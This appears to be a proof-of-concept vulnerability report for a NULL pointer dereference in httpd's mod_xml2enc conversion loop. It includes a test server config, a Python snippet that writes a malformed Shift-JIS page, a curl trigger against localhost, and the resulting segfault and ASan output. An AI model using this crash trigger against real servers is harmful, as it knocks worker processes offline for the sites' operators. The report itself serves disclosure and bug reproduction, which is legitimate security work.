# PoC 197 - Null convset Retained In Conversion Loop

After an unhandled `apr_xlate_conv_buffer()` failure, `xml2enc_ffunc()` sets
`ctx->convset = NULL` but does not break out of the conversion loop, so the
next iteration calls `apr_xlate_conv_buffer(NULL, ...)`.

## Setup

httpd with `mod_xml2enc` plus a consumer that initialises a non-trivial
APR xlate handle (UTF-8 via iconv).

`/tmp/httpd.conf`:

```apache
ServerName 127.0.0.1
Listen 127.0.0.1:8080
LoadModule mpm_event_module      modules/mod_mpm_event.so
LoadModule unixd_module          modules/mod_unixd.so
LoadModule authz_core_module     modules/mod_authz_core.so
LoadModule mime_module           modules/mod_mime.so
LoadModule xml2enc_module        modules/mod_xml2enc.so
LoadModule proxy_html_module     modules/mod_proxy_html.so
LoadModule dir_module            modules/mod_dir.so

DocumentRoot "/tmp/htdocs"
<Directory "/tmp/htdocs">
    Require all granted
    AddOutputFilterByType xml2enc text/html
    # Force the conversion loop with a multibyte source charset.
    xml2EncDefault shift_jis
</Directory>
```

## Trigger

Build a Shift-JIS body that contains a complete multibyte character followed
by a stray lead byte (no trail), so `apr_xlate_conv_buffer()` consumes some
input, returns a non-`APR_SUCCESS`/`APR_EINCOMPLETE`/`APR_EINVAL` status, the
default branch nulls `ctx->convset`, and the outer `while (insz > 0)`
re-enters with `convset == NULL`:

```sh
mkdir -p /tmp/htdocs
python3 -c '
# Valid Shift-JIS "A" (full-width Latin A: 0x82 0x60),
# plus a lone lead byte that produces a permanent decode error
# while leaving insz > 0 in the conversion loop.
body = b"<html><body>" + b"\x82\x60"*32 + b"\x82" + b"</body></html>"
open("/tmp/htdocs/bad.html","wb").write(body)
'
httpd -DFOREGROUND -f /tmp/httpd.conf &
curl -sv http://127.0.0.1:8080/bad.html >/dev/null
```

Some libiconv builds map the trailing-lead-only error to `EINVAL`. If the
default arm is not reached, swap the trailing byte for a sequence that the
local iconv reports as `EILSEQ`/other (for example `b"\xfe\xfe\xfe"` on
many builds).

## Observed effect

- Worker SIGSEGVs with the faulting frame inside `apr_xlate_conv_buffer()`
  reached from `xml2enc_ffunc()` at `modules/filters/mod_xml2enc.c:537`.
  The crash trace shows the second call to `apr_xlate_conv_buffer()` with
  the first argument equal to `NULL`.
- `error.log` contains the existing AH01443/AH01444 conversion failure log
  immediately before the segmentation fault, followed by:

  ```
  child pid ... exit signal Segmentation fault (11)
  ```

- Under ASan: `SEGV on unknown address 0x000000000000` with frame zero in
  `apr_xlate_conv_buffer`.

Standalone confirmation: a small C harness that opens an iconv-backed
`apr_xlate_t`, feeds the same byte sequence to a manual loop matching the
mod_xml2enc structure, and resets `convset = NULL` in the default arm
crashes identically on the next iteration.
